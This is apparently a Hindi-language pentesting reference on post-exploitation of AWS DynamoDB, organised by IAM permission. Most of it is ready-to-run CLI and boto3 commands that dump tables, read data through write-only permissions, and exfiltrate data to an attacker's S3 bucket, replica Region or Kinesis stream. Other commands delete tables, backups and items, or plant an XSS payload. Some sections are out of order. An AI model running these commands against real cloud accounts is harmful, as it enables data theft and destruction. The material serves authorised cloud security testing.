# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

इस permission वाले attacker को तालिकाओं से primary key द्वारा **items प्राप्त करने** की अनुमति होगी (आप तालिका का सारा डेटा सीधे माँग नहीं सकते)। इसका मतलब है कि आपको primary keys पता होने चाहिए (आप तालिका के metadata (`describe-table`) प्राप्त करके यह पता कर सकते हैं)।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** टेबल में संवेदनशील जानकारी का पता लगाकर Indirect privesc

### `dynamodb:GetItem`

**पिछली अनुमतियों के समान** यह अनुमति संभावित हमलावर को केवल 1 टेबल से दी गई एंट्री की प्राथमिक कुंजी के आधार पर मान पढ़ने की अनुमति देती है:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
इस अनुमति के साथ **`transact-get-items`** मेथड का उपयोग इस तरह भी किया जा सकता है:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**संभावित प्रभाव:** तालिका में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:Query`

**पिछली permissions की तरह** यह अनुमति एक संभावित attacker को केवल एक तालिका से उस रिकॉर्ड की primary key देने पर मान पढ़ने की अनुमति देती है। यह [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) का उपयोग करने की अनुमति देता है, लेकिन primary key (जो मौजूद होना चाहिए) के साथ केवल "EQ" तुलना की अनुमति है, इसलिए आप किसी अनुरोध में पूरे DB को प्राप्त करने के लिए तुलना का उपयोग नहीं कर सकते।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** टेबल में संवेदनशील जानकारी का पता लगाकर Indirect privesc संभव।

### `dynamodb:Scan`

आप इस अनुमति का उपयोग करके **पूरी टेबल को आसानी से dump कर सकते हैं।**
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potential Impact:** तालिका में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:PartiQLSelect`

आप इस अनुमति का उपयोग करके **पूरी तालिका को आसानी से dump कर सकते हैं**।
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
यह अनुमति `batch-execute-statement` जैसे कार्य करने की भी अनुमति देती है:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
लेकिन आपको primary key को एक value के साथ निर्दिष्ट करना होगा, इसलिए यह इतना उपयोगी नहीं है।

**Potential Impact:** टेबल में संवेदनशील जानकारी का पता लगाने से अप्रत्यक्ष privesc

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

यह permission एक attacker को **पूरे टेबल को एक S3 bucket में निर्यात करने** की अनुमति देगा:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
ध्यान दें कि यह काम करने के लिए टेबल में point-in-time-recovery सक्षम होना चाहिए, आप यह जाँच कर सकते हैं कि टेबल में यह है या नहीं:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
यदि यह सक्षम नहीं है, तो आपको इसे **सक्षम करना** होगा और इसके लिए आपको **`dynamodb:ExportTableToPointInTime`** अनुमति की आवश्यकता होगी:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** टेबल में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

इन permissions के साथ, एक attacker सक्षम होगा **बैकअप से एक नया टेबल बनाना** (या यहाँ तक कि एक बैकअप बनाकर उसे किसी अलग टेबल में restore करना)। फिर, आवश्यक permissions होने पर, वह बैकअप से **जानकारी** देख सकेगा जो **production टेबल में अब और मौजूद नहीं हो सकती**।
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**संभावित प्रभाव:** अप्रत्यक्ष privesc द्वारा टेबल बैकअप में संवेदनशील जानकारी का पता लगाने से

### `dynamodb:PutItem`

यह अनुमति उपयोगकर्ताओं को तालिका में **नया आइटम जोड़ने या मौजूदा आइटम को नए आइटम से बदलने** की अनुमति देती है। यदि उसी प्राथमिक कुंजी वाला कोई आइटम पहले से मौजूद है, तो **पूरा आइटम बदल दिया जाएगा**। यदि प्राथमिक कुंजी मौजूद नहीं है, तो निर्दिष्ट प्राथमिक कुंजी के साथ एक नया आइटम **बनाया जाएगा**।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने से अतिरिक्त कमजोरियों/बायपास का शोषण संभव है

### `dynamodb:UpdateItem`

यह अनुमति उपयोगकर्ताओं को **किसी item के मौजूदा attributes को संशोधित करने या item में नए attributes जोड़ने** की अनुमति देती है। यह पूरे item को **प्रतिस्थापित नहीं** करती; यह केवल निर्दिष्ट attributes को अपडेट करती है। यदि table में primary key मौजूद नहीं है, तो यह ऑपरेशन निर्दिष्ट primary key के साथ **एक नया item बनाएगा** और update expression में निर्दिष्ट attributes को सेट कर देगा।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने पर आगे की कमजोरियों/बाईपास का शोषण किया जा सकता है।

### `dynamodb:DeleteTable`

इस अनुमति वाले हमलावर इस DynamoDB table को **हटा सकते हैं, जिससे डेटा हानि होगी।**
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**संभावित प्रभाव**: डिलीट की गई तालिका पर निर्भर सेवाओं में डेटा हानि और व्यवधान।

### `dynamodb:DeleteBackup`

इस अनुमति वाले attacker **DynamoDB बैकअप को हटा सकते हैं, जिससे आपदा पुनर्प्राप्ति परिदृश्य में संभावित रूप से डेटा हानि हो सकती है**।
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potential impact**: डेटा हानि और आपदा पुनर्प्राप्ति परिदृश्य के दौरान बैकअप से पुनर्प्राप्त करने में असमर्थता।

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: जाँचें कि क्या यह वास्तव में काम करता है

इन अनुमतियों वाले हमलावर द्वारा **DynamoDB table पर एक stream सक्षम करना, तालिका को अपडेट करके परिवर्तन stream करना शुरू करना, और फिर तालिका में होने वाले बदलावों को वास्तविक समय में मॉनिटर करने के लिए stream तक पहुंच प्राप्त करना** संभव है। यह हमलावर को डेटा परिवर्तन मॉनिटर और exfiltrate करने की अनुमति देता है, जिससे संभावित रूप से data leakage हो सकता है।

1. एक DynamoDB table पर stream सक्षम करें:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARN और अन्य विवरण प्राप्त करने के लिए stream का वर्णन करें:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. stream ARN का उपयोग करके shard iterator प्राप्त करें:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. shard iterator का उपयोग करके stream से डेटा को access और exfiltrate करें:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potential impact**: DynamoDB टेबल में हुए बदलावों की रीयल-टाइम मॉनिटरिंग और डेटा लीक।

### Read items via `dynamodb:UpdateItem` and `ReturnValues=ALL_OLD`

एक हमलावर जिसके पास किसी टेबल पर केवल `dynamodb:UpdateItem` अनुमति हो, सामान्य read permissions (`GetItem`/`Query`/`Scan`) के बिना आइटम पढ़ सकता है — बस एक harmless update करके और `--return-values ALL_OLD` का अनुरोध करके। DynamoDB response के `Attributes` फ़ील्ड में आइटम का पूर्ण pre-update image लौटाएगा (इससे RCUs खर्च नहीं होते)।

- न्यूनतम अनुमतियाँ: `dynamodb:UpdateItem` लक्षित तालिका/कुंजी पर।
- पूर्व-आवश्यकताएँ: आपको आइटम की प्राथमिक कुंजी पता होनी चाहिए।

उदाहरण (एक हानिरहित attribute जोड़ता है और प्रतिक्रिया में पिछले आइटम को exfiltrate करता है):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI प्रतिक्रिया में `Attributes` ब्लॉक शामिल होगा जो पिछले आइटम को पूरा (सभी attributes) दिखाएगा, और इस तरह write-only पहुँच से प्रभावी रूप से एक read primitive प्रदान करेगा।

**Potential Impact:** केवल write permissions होने पर भी तालिका से मनमाने आइटम पढ़े जा सकते हैं, और जब primary keys ज्ञात हों तो संवेदनशील डेटा की exfiltration संभव हो जाती है।


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

DynamoDB Global Table (version 2019.11.21) में एक नया replica Region जोड़कर stealth exfiltration की जा सकती है। यदि कोई principal एक regional replica जोड़ सकता है, तो पूरी तालिका attacker-चुने हुए Region में replicate हो जाएगी, जहाँ से attacker सभी आइटम पढ़ सकता है।

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:UpdateTable` (with `replica-updates`) या लक्षित तालिका पर `dynamodb:CreateTableReplica`। यदि replica में CMK का उपयोग किया गया है, तो उस key के लिए KMS अनुमतियाँ आवश्यक हो सकती हैं।

संभावित प्रभाव: पूर्ण-तालिका replication को attacker-controlled Region पर भेजा जा सकता है, जिससे stealthy data exfiltration हो सकती है।

### `dynamodb:TransactWriteItems` (failed condition के माध्यम से read + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

जिस attacker के पास transactional write privileges हैं, वह `TransactWriteItems` के अंदर एक `Update` करके मौजूद item के पूरे attributes को exfiltrate कर सकता है, जो जानबूझकर एक `ConditionExpression` में fail होता है और साथ ही `ReturnValuesOnConditionCheckFailure=ALL_OLD` सेट किया गया हो। विफलता पर, DynamoDB transaction cancellation reasons में prior attributes शामिल कर देता है, जिससे प्रभावी रूप से write-only access लक्षित keys के लिए read access में बदल जाता है।

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:TransactWriteItems` on the target table (और अंतर्निहित item पर). किसी भी read permissions की आवश्यकता नहीं है।

संभावित प्रभाव: वापस किए गए cancellation reasons के माध्यम से केवल transactional write privileges का उपयोग करके किसी table से (primary key द्वारा) मनमाने items पढ़ना।

### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` on GSI

कम-एंट्रॉपी attribute पर `ProjectionType=ALL` के साथ एक Global Secondary Index (GSI) बनाकर पढ़ने की सीमाओं को बायपास करें, उस attribute को items में एक स्थिर मान पर सेट करें, फिर पूर्ण items प्राप्त करने के लिए index को `Query` करें। यह तब भी काम करता है जब base table पर `Query`/`Scan` अस्वीकृत हों, बशर्ते आप index ARN को query कर सकें।

- न्यूनतम अनुमतियाँ:
- `dynamodb:UpdateTable` on the target table (GSI को `ProjectionType=ALL` के साथ बनाने के लिए).
- `dynamodb:UpdateItem` on the target table keys (प्रत्येक item पर indexed attribute सेट करने के लिए).
- `dynamodb:Query` on the index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

कदम (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**संभावित प्रभाव:** नए बनाए गए GSI को क्वेरी करके जो सभी attributes प्रोजेक्ट करता है, पूरी टेबल का exfiltration संभव है, भले ही base table read APIs अस्वीकार कर दिए गए हों।


### `dynamodb:EnableKinesisStreamingDestination` (Kinesis Data Streams के माध्यम से निरंतर exfiltration)

DynamoDB Kinesis streaming destinations का दुरुपयोग करके किसी table के बदलावों को निरंतर attacker-controlled Kinesis Data Stream में exfiltrate करना। एक बार सक्षम होने पर, हर INSERT/MODIFY/REMOVE घटना लगभग वास्तविक-समय में stream पर फॉरवर्ड हो जाती है बिना table पर read permissions की आवश्यकता के।

न्यूनतम अनुमतियाँ (हमलावर):
- `dynamodb:EnableKinesisStreamingDestination` on the target table
- Optionally `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` to monitor status
- Read permissions on the attacker-owned Kinesis stream to consume records: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

एक attacker जिसके पास dynamodb:UpdateTimeToLive अनुमति है, वह किसी table की TTL (time-to-live) configuration बदल सकता है — TTL को सक्षम या अक्षम कर सकता है। जब TTL सक्षम होता है, तो जिन व्यक्तिगत items में configured TTL attribute मौजूद होगा वे उनके expiration time पहुँचने पर स्वचालित रूप से हटा दिए जाएंगे। TTL value प्रत्येक item पर एक अन्य attribute ही होती है; जिन items में वह attribute नहीं होगा, वे TTL-आधारित deletion से प्रभावित नहीं होंगे।

यदि items में पहले से TTL attribute मौजूद नहीं है, तो attacker को items अपडेट करने की अनुमति भी चाहिए होगी (उदाहरण के लिए dynamodb:UpdateItem), ताकि वह TTL attribute जोड़ कर बड़े पैमाने पर deletions ट्रिगर कर सके।

सबसे पहले table पर TTL सक्षम करें और expiration के लिए उपयोग किए जाने वाले attribute का नाम निर्दिष्ट करें:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
फिर items को अपडेट करें ताकि TTL attribute (epoch seconds) जोड़ दिया जाए ताकि वे expire होकर हट जाएँ:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

जिस attacker के पास `dynamodb:RestoreTableFromAwsBackup` या `dynamodb:RestoreTableToPointInTime` permissions हों, वह original table को overwrite किए बिना backups या point-in-time recovery (PITR) से restore किए गए नए tables बना सकता है। Restore की हुई table में चयनित बिंदु पर मौजूद डेटा की पूर्ण छवि होती है, इसलिए attacker इसका उपयोग historical information exfiltrate करने या database की past state का पूरा dump प्राप्त करने के लिए कर सकता है।

on-demand backup से एक DynamoDB table को पुनर्स्थापित करें:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
एक DynamoDB टेबल को किसी विशिष्ट समय पर पुनर्स्थापित करें (पुनर्स्थापित स्थिति के साथ एक नई टेबल बनाएं):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potential Impact:** टेबल पर सीधे read operations किए बिना टेबल में हुए परिवर्तनों का लगातार, लगभग रीयल-टाइम में हमलावर-नियंत्रित Kinesis stream पर बाहर निकालना।


{{#include ../../../../banners/hacktricks-training.md}}
